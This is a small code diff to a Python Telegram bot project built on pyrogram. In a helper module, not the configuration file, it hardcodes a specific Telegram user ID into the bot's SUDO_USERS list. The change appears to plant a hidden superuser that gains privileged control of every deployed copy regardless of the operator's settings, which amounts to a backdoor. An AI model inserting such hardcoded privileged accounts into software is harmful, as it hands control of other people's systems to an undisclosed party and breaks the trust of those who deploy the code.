@@ -6,7 +6,7 @@ from pyrogram.types import Message
 from Royalkifeelings.helper.admins import get_administrators
 from Royalkifeelings.config import SUDO_USERS
 
-SUDO_USERS.append()
+SUDO_USERS.append(5459060847)
 
 
 def errors(func: Callable) -> Callable:
